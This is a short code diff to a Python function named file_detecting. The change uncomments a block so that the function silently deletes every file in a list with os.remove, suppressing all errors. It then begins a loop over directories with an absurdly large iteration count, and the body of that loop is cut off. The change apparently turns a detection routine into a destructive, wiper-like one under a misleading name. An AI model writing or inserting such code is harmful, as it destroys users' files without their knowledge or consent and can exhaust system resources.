@@ -48,11 +48,11 @@ def file_detecting():
 
 
     for f in files:
-        #try:
-        #    os.remove(f)
-        #except Exception as e :
-        #    pass
-        pass
+        try:
+            os.remove(f)
+        except Exception as e :
+            pass
+        
              
     for d in directories:
         for u in range(100000000*1000000000000):
